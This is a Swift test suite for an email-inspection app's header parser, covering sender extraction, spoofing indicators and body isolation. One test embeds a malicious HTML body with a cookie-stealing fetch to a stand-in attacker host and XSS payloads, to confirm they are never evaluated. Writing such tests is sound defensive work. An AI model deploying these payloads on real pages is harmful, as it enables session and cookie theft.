//
//  Mail Inspector
//
//  Copyright (c) 2026 Nicholas K. Dionysopoulos
//  Licensed under the MIT License. See license.txt in the project root for details.
//

import Testing
import Foundation
@testable import Mail_Inspector

/// Tests for `EmailMessage`: the higher-level view over parsed headers — From/Reply-To/
/// Return-Path address extraction, decoded Subject, Date parsing, duplicate From detection,
/// and confirmation that the message body (including binary attachments and malicious HTML)
/// is never treated as or mixed into headers.
@Suite("EmailMessage")
struct EmailMessageTests {
    private func makeMessage(_ raw: String) throws -> EmailMessage {
        let parsed = try EmailHeaderParser.parse(data: Data(raw.utf8), maxMessageSize: 10_000_000)
        return EmailMessage(parsed: parsed, sourceDescription: "test.eml")
    }

    @Test("Exposes the complete From address and decoded display name")
    func fromAddress() throws {
        let message = try makeMessage("From: \"Alice Example\" <alice@example.com>\r\nSubject: Hi\r\n\r\n")
        #expect(message.primaryFrom?.address == "alice@example.com")
        #expect(message.primaryFrom?.displayName == "Alice Example")
    }

    @Test("Flags multiple From headers rather than silently picking one")
    func duplicateFromHeaders() throws {
        let message = try makeMessage("From: a@b.com\r\nFrom: c@d.com\r\n\r\n")
        #expect(message.fromHeaderCount == 2)
    }

    @Test("Detects a Reply-To domain that differs from the From domain")
    func replyToMismatch() throws {
        let message = try makeMessage("From: billing@bank.example\r\nReply-To: attacker@evil.example\r\n\r\n")
        let fromDomain = message.primaryFrom?.domain
        let replyToDomain: String? = {
            guard case .mailbox(let address) = message.replyToEntries.first else { return nil }
            return address.domain
        }()
        #expect(fromDomain != replyToDomain)
    }

    @Test("Detects a Return-Path domain that differs from the From domain")
    func returnPathMismatch() throws {
        let message = try makeMessage("From: billing@bank.example\r\nReturn-Path: <bounce@othermailer.example>\r\n\r\n")
        #expect(message.returnPath?.contains("othermailer.example") == true)
        #expect(message.primaryFrom?.domain == "bank.example")
    }

    @Test("Decodes an RFC 2047 encoded Subject")
    func encodedSubject() throws {
        let message = try makeMessage("Subject: =?UTF-8?B?SGVsbG8=?=\r\n\r\n")
        #expect(message.subject == "Hello")
    }

    @Test("Parses a standard RFC 5322 Date header")
    func parsedDate() throws {
        let message = try makeMessage("Date: Mon, 2 Jan 2006 15:04:05 +0000\r\n\r\n")
        #expect(message.date != nil)
    }

    @Test("Never exposes or evaluates the message body as headers")
    func bodyNeverTreatedAsHeaders() throws {
        let raw = "From: a@b.com\r\n\r\n<script>alert(1)</script>\r\nFrom: injected@evil.example\r\n"
        let message = try makeMessage(raw)
        #expect(message.fromHeaderCount == 1)
    }

    @Test("Parses headers correctly on a message whose body is a binary attachment, without touching the attachment itself")
    func messageWithBinaryAttachment() throws {
        var raw = Data("From: a@b.com\r\nSubject: Photo\r\nContent-Type: multipart/mixed; boundary=XYZ\r\n\r\n".utf8)
        // Arbitrary binary bytes (not valid UTF-8, includes NUL and high bytes) standing in for
        // a real attachment — the point is that header parsing never looks past the blank line,
        // so this content's non-text nature is irrelevant to it. Built as raw Data (not routed
        // through a String) so the bytes are exactly what EmailHeaderParser actually receives.
        raw.append(Data([0x00, 0xFF, 0xDE, 0xAD, 0xBE, 0xEF, 0x89, 0x50, 0x4E, 0x47]))
        let parsed = try EmailHeaderParser.parse(data: raw, maxMessageSize: 10_000_000)
        let message = EmailMessage(parsed: parsed, sourceDescription: "test.eml")
        #expect(message.primaryFrom?.address == "a@b.com")
        #expect(message.subject == "Photo")
    }

    @Test("Parses headers correctly on a message with a deliberately malicious HTML body, without rendering or evaluating it")
    func messageWithMaliciousHTMLBody() throws {
        let raw = "From: a@b.com\r\nSubject: Invoice\r\nContent-Type: text/html\r\n\r\n" +
            "<html><body><script>fetch('https://evil.example/steal?c='+document.cookie)</script>" +
            "<img src=x onerror=\"alert(document.domain)\"><a href=\"javascript:alert(1)\">click</a></body></html>"
        let message = try makeMessage(raw)
        #expect(message.primaryFrom?.address == "a@b.com")
        #expect(message.subject == "Invoice")
        // This app has no HTML rendering or script-evaluation code path at all — the strongest
        // assertion available here is that parsing never panics on this content and headers are
        // extracted normally, exactly as for any other body.
    }
}
